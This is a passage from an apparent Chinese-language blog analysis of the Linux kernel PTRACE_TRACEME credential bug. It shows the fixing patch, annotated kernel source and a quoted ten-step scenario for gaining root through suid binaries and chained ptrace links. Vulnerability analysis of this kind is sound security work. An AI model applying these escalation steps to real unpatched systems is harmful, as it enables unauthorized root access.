attacker-controlled</span></span><br><span class="line"><span class="string">(because it drops privileges and calls execve()), the attacker ends up</span></span><br><span class="line"><span class="string">with control over two processes with a privileged ptrace relationship,</span></span><br><span class="line"><span class="string">which can be abused to ptrace a suid binary and obtain root privileges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Fix both of these by always recording the credentials of the process</span></span><br><span class="line"><span class="string">that is requesting the creation of the ptrace relationship:</span></span><br><span class="line"><span class="string">current_cred() can'</span>t change under us, and current is the proper subject</span><br><span class="line"><span class="keyword">for</span> access control.</span><br></pre></td></tr></table></figure>

<p>以上是补丁的描述，以下是补丁的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="line">index <span class="number">8456b</span>6e.<span class="number">.705887</span>f <span class="number">100644</span></span><br><span class="line">--- a/kernel/ptrace.c</span><br><span class="line">+++ b/kernel/ptrace.c</span><br><span class="line">@@ <span class="number">-79</span>,<span class="number">9</span> +<span class="number">79</span>,<span class="number">7</span> @@ <span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line">-	rcu_read_lock();</span><br><span class="line">-	__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">-	rcu_read_unlock();</span><br><span class="line">+	__ptrace_link(child, new_parent, current_cred());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>从补丁的描述来看，一共修复了 2 个问题</p>
<ul>
<li>1 是 rcu reference 的问题，对应的代码是删除了 rcu 锁; </li>
<li>2 是 tracee 记录 tracer 进程的 cred 引发的问题</li>
</ul>
<p>本文不关心第一个问题，只分析可以用于本地提权的第二个问题</p>
<p>从补丁描述看第二个问题比较复杂，我们后面再分析，补丁对应的代码倒是非常简单，<br>将 ‘__task_cred(new_parent)’ 换成了 ‘current_cred()’, 也就是说记录的 cred 从 tracer 进程的 cred 换成了当前进程的 cred</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">ptrace</a> 是一个系统调用，它提供了一种方法来让进程 (tracer) 可以观察和控制其它进程 (tracee) 的执行，检查和改变其核心映像以及寄存器, 主要用来实现断点调试和系统调用跟踪</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>    <span class="number">396</span>  kernel/ptrace.c &lt;&lt;ptrace_attach&gt;&gt;</span><br><span class="line">          ptrace_link(task, current);  <span class="comment">// link 的双方分别是要 trace 的目标进程 'task' </span></span><br><span class="line">		  <span class="comment">//  和发动 trace 的当前进程 'current'</span></span><br><span class="line"><span class="number">2</span>    <span class="number">469</span>  kernel/ptrace.c &lt;&lt;ptrace_traceme&gt;&gt;</span><br><span class="line">          ptrace_link(current, current-&gt;real_parent);  <span class="comment">// link 的双方分别是发动 trace 的</span></span><br><span class="line">				  <span class="comment">// 当前进程 ‘current’ 和当前进程的</span></span><br><span class="line">				  <span class="comment">// 父进程 ' current-&gt;real_parent'</span></span><br></pre></td></tr></table></figure>

<p>trace 关系的建立有 2 种方式</p>
<ul>
<li>1 是进程调用 fork 函数然后子进程主动调用 PTRACE_TRACEME, 这是由 tracee 发起的, 对应内核函数 ptrace_traceme</li>
<li>2 是进程调用 PTRACE_ATTACH 或者 PTRACE_SEIZE 去主动 trace 其他进程, 这是由 tracer 发起的, 对应内核函数 ptrace_attach</li>
</ul>
<p>不管是哪种方式，最后都会调用 ptrace_link 函数去建立 tracer 和 tracee 之间的 trace 关系</p>
<ul>
<li>ptrace_attach 关联的双方是 ‘task’ (tracee) 和 ‘current’ (tracer) </li>
<li>ptrace_traceme 关联的双方是 ‘current’ (tracee) 和 ‘current-&gt;real_parent’ (tracer)</li>
</ul>
<p>这里我们要仔细记住上面 2 种模式下 tracer 和 tracee 分别是什么，因为这就是漏洞的关键</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ptrace_link</span><span class="params">(struct task_struct *child, struct task_struct *new_parent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">                   <span class="keyword">const</span> struct cred *ptracer_cred)</span><br><span class="line">&#123;</span><br><span class="line">        BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">        list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced); <span class="comment">// 1. 将自己加入父进程的 ptraced 队列</span></span><br><span class="line">        child-&gt;parent = new_parent; <span class="comment">// 2. 将父进程地址保存在 parent 指针</span></span><br><span class="line">        child-&gt;ptracer_cred = get_cred(ptracer_cred); <span class="comment">// 3. 保存 ptracer_cred, 我们只关注这个变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>建立 trace 关系的关键是由 tracee 记录 tracer 的 cred, 保存在 tracee 的 ‘ptracer_cred’ 变量，这个变量名很顾名思义</p>
<p>ptracer_cred 这个概念是由 2016 年的一个补丁 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67" target="_blank" rel="noopener">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a> 引入的, 引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 时做安全检测</p>
<p>为什么需要这个安全检测呢?</p>
<p><a href="http://man7.org/linux/man-pages/man3/exec.3.html" target="_blank" rel="noopener">exec</a> 函数族可以更新进程的镜像, 如果被执行文件的 <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 置位，则运行这个可执行文件时，进程的 <a href="https://en.wikipedia.org/wiki/User_identifier" target="_blank" rel="noopener">euid</a> 会被修改成该可执行文件的所有者的 uid, 如果可执行文件的所有者权限比调用 exec 的进程高, 运行这类 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 会有提权的效果</p>
<p>假如执行 exec 的进程本身是一个 tracee, 当它执行了 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 提权之后，由于 tracer 可以随时修改 tracee 的寄存器和内存，这时候低权限的 tracer 就可以控制 tracee 去执行越权操作</p>
<p>作为内核，显然是不允许这样的越权行为存在的，所以当 trace 关系建立时, tracee 需要保存 tracer 的 cred (即 ptracer_cred), 然后在执行 exec 过程中, 如果发现执行的可执行程序是 <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 置位的， 则会判断 ‘ptracer_cred’ 的权限， 如果权限不满足，将不会执行  <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 的提权， 而是以原有的进程权限执行这个  <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> </p>
<p>这个过程的代码分析如下(本文的代码分析基于 v4.19-rc8)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">do_execve</span><br><span class="line">  -&gt; __do_execve_file</span><br><span class="line">  -&gt; prepare_binprm </span><br><span class="line">      -&gt; bprm_fill_uid</span><br><span class="line">      -&gt; security_bprm_set_creds</span><br><span class="line">          -&gt;cap_bprm_set_creds</span><br><span class="line">  	    -&gt; ptracer_capable</span><br><span class="line">          -&gt;selinux_bprm_set_creds</span><br><span class="line">          -&gt;(apparmor_bprm_set_creds)</span><br><span class="line">          -&gt;(smack_bprm_set_creds)</span><br><span class="line">          -&gt;(tomoyo_bprm_set_creds)</span><br></pre></td></tr></table></figure>

<p>如上，execve 权限相关的操作主要在函数 ‘prepare_binprm’ 里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1567</span> <span class="function"><span class="keyword">int</span> <span class="title">prepare_binprm</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">1568 </span>&#123;</span><br><span class="line"><span class="number">1569</span>         <span class="keyword">int</span> retval;</span><br><span class="line"><span class="number">1570</span>         <span class="keyword">loff_t</span> pos = <span class="number">0</span>;</span><br><span class="line"><span class="number">1571</span> </span><br><span class="line"><span class="number">1572</span>         bprm_fill_uid(bprm); <span class="comment">// &lt;-- 初步填充新进程的 cred</span></span><br><span class="line"><span class="number">1573</span> </span><br><span class="line"><span class="number">1574</span>         <span class="comment">/* fill in binprm security blob */</span></span><br><span class="line"><span class="number">1575</span>         retval = security_bprm_set_creds(bprm); <span class="comment">// &lt;-- 安全检测， 	</span></span><br><span class="line">			 <span class="comment">// 可能会修改新进程的 cred</span></span><br><span class="line"><span class="number">1576</span>         <span class="keyword">if</span> (retval)</span><br><span class="line"><span class="number">1577</span>                 <span class="keyword">return</span> retval;</span><br><span class="line"><span class="number">1578</span>         bprm-&gt;called_set_creds = <span class="number">1</span>;</span><br><span class="line"><span class="number">1579</span> </span><br><span class="line"><span class="number">1580</span>         <span class="built_in">memset</span>(bprm-&gt;buf, <span class="number">0</span>, BINPRM_BUF_SIZE);</span><br><span class="line"><span class="number">1581</span>         <span class="keyword">return</span> kernel_read(bprm-&gt;file, bprm-&gt;buf, BINPRM_BUF_SIZE, &amp;pos);</span><br><span class="line"><span class="number">1582</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上，先调用 ‘bprm_fill_uid’ 初步填充新进程的 cred, 再调用 ‘security_bprm_set_creds’ 做安全检测并修改新的 cred</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1509</span> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bprm_fill_uid</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">1510 </span>&#123;</span><br><span class="line"><span class="number">1511</span>         <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="number">1512</span>         <span class="keyword">unsigned</span> <span class="keyword">int</span> mode;</span><br><span class="line"><span class="number">1513</span>         <span class="keyword">kuid_t</span> uid;</span><br><span class="line"><span class="number">1514</span>         <span class="keyword">kgid_t</span> gid;</span><br><span class="line"><span class="number">1515</span> </span><br><span class="line"><span class="number">1516</span>         <span class="comment">/*</span></span><br><span class="line"><span class="comment">1517          * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment">1518          * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment">1519          * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment">1520          * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment">1521          */</span></span><br><span class="line"><span class="number">1522</span>         bprm-&gt;cred-&gt;euid = current_euid(); <span class="comment">// &lt;--- 先使用本进程的euid</span></span><br><span class="line"><span class="number">1523</span>         bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"><span class="number">1524</span> </span><br><span class="line"><span class="number">1525</span>         <span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line"><span class="number">1526</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1527</span> </span><br><span class="line"><span class="number">1528</span>         <span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line"><span class="number">1529</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1530</span> </span><br><span class="line"><span class="number">1531</span>         inode = bprm-&gt;file-&gt;f_path.dentry-&gt;d_inode;</span><br><span class="line"><span class="number">1532</span>         mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line"><span class="number">1533</span>         <span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID))) <span class="comment">// &lt;---------- 如果可执行文件没有 setuid/setgid 位，这里就可以返回了</span></span><br><span class="line"><span class="number">1534</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1535</span> </span><br><span class="line"><span class="number">1536</span>         <span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line"><span class="number">1537</span>         inode_lock(inode);</span><br><span class="line"><span class="number">1538</span> </span><br><span class="line"><span class="number">1539</span>         <span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line"><span class="number">1540</span>         mode = inode-&gt;i_mode;</span><br><span class="line"><span class="number">1541</span>         uid = inode-&gt;i_uid; <span class="comment">// &lt;---- 如果文件 S_ISUID 置位，使用文件的 i_uid</span></span><br><span class="line"><span class="number">1542</span>         gid = inode-&gt;i_gid;</span><br><span class="line"><span class="number">1543</span>         inode_unlock(inode);</span><br><span class="line"><span class="number">1544</span> </span><br><span class="line"><span class="number">1545</span>         <span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line"><span class="number">1546</span>         <span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line"><span class="number">1547</span>                  !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line"><span class="number">1548</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1549</span> </span><br><span class="line"><span class="number">1550</span>         <span class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line"><span class="number">1551</span>                 bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line"><span class="number">1552</span>                 bprm-&gt;cred-&gt;euid = uid; <span class="comment">// &lt;------ 使用文件的 i_uid 作为新进程的 euid</span></span><br><span class="line"><span class="number">1553</span>         &#125;</span><br><span class="line"><span class="number">1554</span> </span><br><span class="line"><span class="number">1555</span>         <span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line"><span class="number">1556</span>                 bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line"><span class="number">1557</span>                 bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line"><span class="number">1558</span>         &#125;</span><br><span class="line"><span class="number">1559</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， 主要看两行</p>
<ul>
<li>1522 行, 将当前的 euid 赋值新的 euid, 所以大部分执行了 execve 的进程的权限跟原来的一样</li>
<li>1552 行，如果带有 suid bit, 则将可执行文件的所有者的 uid 赋值新的 euid, 这就是所谓 setuid 的实现， 新的 euid 变成了它执行的可执行文件所有者的 uid， 如果所有者是特权用户， 这里就实现了提权</li>
</ul>
<p>但是，这里的 euid 依然不是最终的结果， 还需要进入函数 security_bprm_set_creds 做进一步的安全检测</p>
<p>security_bprm_set_creds 函数调用的是 <a href="https://en.wikipedia.org/wiki/Linux_Security_Modules" target="_blank" rel="noopener">LSM</a> 框架</p>
<p>在我分析的内核版本上, 实现 ‘bprm_set_creds’ 这个 hook 点安全检测的 lsm 框架有 5 种, 检测函数如下, </p>
<ul>
<li>cap_bprm_set_creds</li>
<li>selinux_bprm_set_creds</li>
<li>apparmor_bprm_set_creds</li>
<li>smack_bprm_set_creds</li>
<li>tomoyo_bprm_set_creds</li>
</ul>
<p>这里哪些 hook 检测函数会被执行，其实是跟具体的内核配置有关的, 理论上把所有 lsm 框架都启用的话，上述所有这些实现了 ‘bprm_set_creds’ hook 检测的函数都会被执行 </p>
<p>在我的分析环境里实际运行的检测函数只有 cap_bprm_set_creds 和 selinux_bprm_set_creds 这俩</p>
<p>其中， 对 euid 有影响的是 ‘cap_bprm_set_creds’ 这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">815</span> <span class="function"><span class="keyword">int</span> <span class="title">cap_bprm_set_creds</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">    816 </span>&#123;</span><br><span class="line">    <span class="number">817</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> = <span class="title">current_cred</span>();</span></span><br><span class="line">    <span class="number">818</span>         <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> = <span class="title">bprm</span>-&gt;<span class="title">cred</span>;</span></span><br><span class="line">    <span class="number">819</span>         <span class="keyword">bool</span> effective = <span class="literal">false</span>, has_fcap = <span class="literal">false</span>, is_setid;</span><br><span class="line">    <span class="number">820</span>         <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="number">821</span>         <span class="keyword">kuid_t</span> root_uid;</span><br><span class="line">    ===================== skip ======================</span><br><span class="line">    <span class="number">838</span>         <span class="comment">/* Don't let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment">    839          * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment">    840          *</span></span><br><span class="line"><span class="comment">    841          * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment">    842          */</span></span><br><span class="line">    <span class="number">843</span>         is_setid = __is_setuid(<span class="keyword">new</span>, old) || __is_setgid(<span class="keyword">new</span>, old);  </span><br><span class="line">    <span class="number">844</span> </span><br><span class="line">    <span class="number">845</span>         <span class="keyword">if</span> ((is_setid || __cap_gained(permitted, <span class="keyword">new</span>, old)) &amp;&amp; <span class="comment">// &lt;---- 检测是否执行的是 setid 程序</span></span><br><span class="line">    <span class="number">846</span>             ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) || </span><br><span class="line">    <span class="number">847</span>              !ptracer_capable(current, <span class="keyword">new</span>-&gt;user_ns))) &#123; <span class="comment">// &lt;----- 如果执行execve的进程被trace了，且执行的程序是 setuid 的，需要增加权限检测</span></span><br><span class="line">    <span class="number">848</span>                 <span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">    <span class="number">849</span>                 <span class="keyword">if</span> (!ns_capable(<span class="keyword">new</span>-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">    <span class="number">850</span>                     (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">    <span class="number">851</span>                         <span class="keyword">new</span>-&gt;euid = <span class="keyword">new</span>-&gt;uid; <span class="comment">// &lt;----- 如果检测不通过，会将新进程的 euid 重新设置为原进程的 uid</span></span><br><span class="line">    <span class="number">852</span>                         <span class="keyword">new</span>-&gt;egid = <span class="keyword">new</span>-&gt;gid;</span><br><span class="line">    <span class="number">853</span>                 &#125;</span><br><span class="line">    <span class="number">854</span>                 <span class="keyword">new</span>-&gt;cap_permitted = cap_intersect(<span class="keyword">new</span>-&gt;cap_permitted,</span><br><span class="line">    <span class="number">855</span>                                                    old-&gt;cap_permitted);</span><br><span class="line">    <span class="number">856</span>         &#125;</span><br><span class="line">    <span class="number">857</span> </span><br><span class="line">    <span class="number">858</span>         <span class="keyword">new</span>-&gt;suid = <span class="keyword">new</span>-&gt;fsuid = <span class="keyword">new</span>-&gt;euid;</span><br><span class="line">    <span class="number">859</span>         <span class="keyword">new</span>-&gt;sgid = <span class="keyword">new</span>-&gt;fsgid = <span class="keyword">new</span>-&gt;egid;</span><br><span class="line">    ===================== skip ======================</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上</p>
<ul>
<li>行 845, 检测 euid 是否跟原有的 uid 不一致 (在函数 bprm_fill_uid 分析里我们知道，如果执行的文件是 setuid bit 的， euid 就会不一致)<pre><code>所以这里等同于检测执行的可执行程序是不是 setid 程序</code></pre></li>
<li>行 847, 检测本进程是否是 tracee </li>
</ul>
<p>如果两个条件同时满足，需要执行 ptracer_capable 函数进行权限检测，假设检测不通过， 会执行 downgrade 降权</p>
<ul>
<li>行 851, 将 new-&gt;euid 的值重新变成 new-&gt;uid， 就是说在函数 bprm_fill_uid 里提的权在这里可能又被降回去</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">499</span> <span class="function"><span class="keyword">bool</span> <span class="title">ptracer_capable</span><span class="params">(struct task_struct *tsk, struct user_namespace *ns)</span></span></span><br><span class="line"><span class="function">500 </span>&#123;</span><br><span class="line"><span class="number">501</span>         <span class="keyword">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="number">502</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line"><span class="number">503</span>         rcu_read_lock();</span><br><span class="line"><span class="number">504</span>         cred = rcu_dereference(tsk-&gt;ptracer_cred); <span class="comment">// &lt;----- 取出 ptrace_link 时保存的 ptracer_cred </span></span><br><span class="line"><span class="number">505</span>         <span class="keyword">if</span> (cred)</span><br><span class="line"><span class="number">506</span>                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE); <span class="comment">// &lt;-------- 进入 lsm 框架进行安全检测</span></span><br><span class="line"><span class="number">507</span>         rcu_read_unlock();</span><br><span class="line"><span class="number">508</span>         <span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line"><span class="number">509</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， </p>
<ul>
<li>行 504, 取出 ‘tsk-&gt;ptracer_cred’ </li>
<li>行 506, 进入 lsm 框架对 ‘tsk-&gt;ptracer_cred’ 进行检测</li>
</ul>
<p>到了这里， 这个漏洞涉及到的变量 ‘tsk-&gt;ptracer_cred’ 终于出现了， 如前所述，这个变量是建立 trace 关系时， tracee 保存的 tracer 的 cred</p>
<p>当 tracee 随后执行 execve 去执行 suid 可执行程序时，就会调用 ptracer_capable 这个函数， 通过 lsm 里的安全框架去判断 ‘ptracer_cred’ 的权限</p>
<p>lsm 框架里的 capable hook 检测我们这里不分析了， 简单来说， 如果 tracer 本身是 root 权限， 则这里的检测会通过， 如果不是， 就会返回失败</p>
<p>根据前面的分析，如果  ptracer_capable 检测失败， new-&gt;euid 的权限会被降回去</p>
<p>举个例子， A ptrace B , B execve 执行 ‘/usr/bin/passwd’, 根据上面代码的分析， 如果 A 是 root 权限， 则 B 执行 passwd 时的 euid 是 root, 否则就还是原有的权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kernel/ptrace.c &lt;&lt;ptrace_traceme&gt;&gt;</span><br><span class="line">             ptrace_link(current, current-&gt;real_parent);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ptrace_link</span><span class="params">(struct task_struct *child, struct task_struct *new_parent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到漏洞代码, 为什么 traceme 在建立 trace link 时记录 parent 的 cred 是不对的呢?  明明这时候 parent 就是 tracer 啊?</p>
<p>我们用 Jann Horn 举的例子来说明为什么 traceme 这种方式建立 trace link 时不能使用 tracer 的 cred</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 1, task A: fork()s a child, task B</span><br><span class="line">- 2, task B: fork()s a child, task C</span><br><span class="line">- 3, task B: execve(/some/special/suid/binary)</span><br><span class="line">- 4, task C: PTRACE_TRACEME (creates privileged ptrace relationship)</span><br><span class="line">- 5, task C: execve(/usr/bin/passwd)</span><br><span class="line">- 6, task B: drop privileges (setresuid(getuid(), getuid(), getuid()))</span><br><span class="line">- 7, task B: become dumpable again (e.g. execve(/some/other/binary))</span><br><span class="line">- 8, task A: PTRACE_ATTACH to task B</span><br><span class="line">- 9, task A: use ptrace to take control of task B</span><br><span class="line">- 10, task B: use ptrace to take control of task C</span><br></pre></td></tr></table></figure>

<p>如上场景有 3 个进程 A, B, C</p>
<ul>
<li>第 4 步， task C 使用 PTRACE_TRACE 建立跟 B 的 trace link 时， 由于 B 此时是 euid = 0 (因为它刚刚执行了 suid binary), 所以 C 记录的 ptracer_cred 的 euid 也是 0 </li>
<li>第 5 步， task C 随后执行 execve(suid binary), 根据我们上面的分析，由于 C 的 ptracer_cred 是特权的， 所以 ptracer_capable 函数检测通过，所以执行完 execve 后， task C 的 euid 也提权成 0 , 注意此时 B 和 C 的 trace link 还是有效的</li>
<li>第 6 步， task B 执行 setresuid 将自己降权， 这个降权的目的是为了能让 task A attach</li>
<li>第 8 步， task A 使用 PTRACE_ATTACH 建立跟 B 的 trace link, A 和 B 都是普通权限, 之后 A 可以控制 B 执行任何操作</li>
<li>第 9 步， task B 控制 task C 执行提权操作</li>
</ul>
<p>前面 8 步，依据之前的代码分析都是成立的，那么第 9 步能不能成立呢?</p>
<p>执行第 9 步时， task B 本身是普通权限， task C 的 euid 是 root 权限， B 和 C 的 trace link 有效, 这种条件下 B 能不能发送 ptrace request 让 C 执行各种操作，包括提权操作? </p>
<p>下面我们结合代码分析这个问题</p>
